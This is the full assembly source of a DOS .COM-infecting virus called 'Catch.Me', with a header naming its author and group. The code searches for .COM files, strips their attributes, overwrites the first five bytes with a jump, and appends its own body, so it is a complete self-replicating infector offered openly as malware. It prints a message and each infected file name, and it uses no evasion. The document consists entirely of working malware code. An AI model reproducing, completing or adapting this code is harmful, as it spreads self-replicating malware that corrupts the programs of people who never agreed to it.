;########################################################################### 
# 
;# Virus Name: Catch.Me                        # Size: 371 Bytes 
# 
;# Author: Jerk1N                              # EMail: jerk1n@trust-me.com 
# 
;########################################################################### 
# 
;# Notes 
# 
;#  - Tells the user which files it's infecting! 
# 
;#  - Uses NO anti-virus tricks, encryption etc. 
# 
;########################################################################### 
# 
 .model tiny 
 .radix 16 
 .code 
start: 
        db      03h,00h,0E9h,00h,00h 
gotacod: 
 call $+3 
getdo: pop di 
 sub di,offset $-1 
 xchg bp,di 
 jmp om 
msg     db      'I am the Catch.Me Virus written Jerk1N of 
DIFFUSION',0Dh,0Ah 
 db 'I am infecting files -',0Dh,0Ah,'$' 
om:     mov     ah,1Ah 
 lea dx,[bp+offset dta] 
 int 21h 
 mov ah,09h 
 lea dx,[bp+offset msg] 
 int 21h 
 mov di,100h 
 lea si,[bp+offset orig] 
 movsw 
 movsw 
        movsb 
 call findfile 
        call    fndnext 
ohcrap: 
 push 100h 
 retn 
fspec db '*.COM',0 
ID db '[Catch.Me]',0 
creator db '[Jerk1N/DIFFUSION]',0 
orig    db      0CDh,20h,00h,00h,00h 
new3    db      03h,00h,0E9h,00h,00h 
findfile: 
        call    cleara 
 mov ah,4Eh 
 mov cx,07h 
 lea dx,[bp+offset fspec] 
 int 21h 
 jc ohcrap 
 jmp infect 
fndnext: 
        call    cleara 
 mov ah,4Fh 
 int 21h 
 jc ohcrap 
 jmp infect 
infect: 
 mov ax,4301h 
 mov cx,00h 
 lea dx,[bp+offset dta+1Eh] 
 int 21h    ;Clear Attributes 
 call fopen 
 jc ohcrap 
 mov ax,4202h 
 xor cx,cx 
 xor dx,dx 
 int 21h 
        sub     ax,05h 
        mov     word ptr [bp+offset new3+3h],ax 
 mov ax,4200h 
 xor cx,cx 
 xor dx,dx 
 int 21h 
 mov ah,3Fh 
        mov     cx,5h                           ;Headr Len 
 lea dx,[bp+offset orig] 
 int 21h    ;Get orig code! 
        cmp     byte ptr [bp+offset orig],03h 
 jne goinf 
        cmp     byte ptr [bp+offset orig+2h],0E9h 
 je fndnext 
goinf: 
 mov ax,4200h 
 xor cx,cx 
 xor dx,dx 
 int 21h 
 mov ah,40h 
        mov     cx,05h                          ;Headr Len 
 lea dx,[bp+offset new3] 
 int 21h    ;Write Header! 
 mov ax,4202h 
 xor cx,cx 
 xor dx,dx 
 int 21h 
 mov ah,40h 
 mov cx,V_len 
 lea dx,[bp+offset gotacod] 
 int 21h    ;Write Virus 
 call closef 
 lea dx,[bp+offset dta+1Eh] 
 mov ah,09h 
 int 21h 
        lea     dx,[bp+offset retun] 
        int     21h 
 ret 
cleara: 
        mov     cx,20h 
 mov ax,'$$' 
        lea     bx,[bp+offset dta+1Eh] 
l: mov [bx],ax 
 inc bx 
 inc bx 
 loop l 
        ret 
fopen: 
 mov ah,3Dh 
 mov al,02h 
 int 21h 
 xchg bx,ax 
 ret 
closef: 
 mov ah,3Eh 
 int 21h 
 ret 
V_len equ offset heap - offset gotacod 
retun   db      0Dh,0Ah,'$' 
heap:      ;Destroy all data below this line 
dta     equ $ 
 end 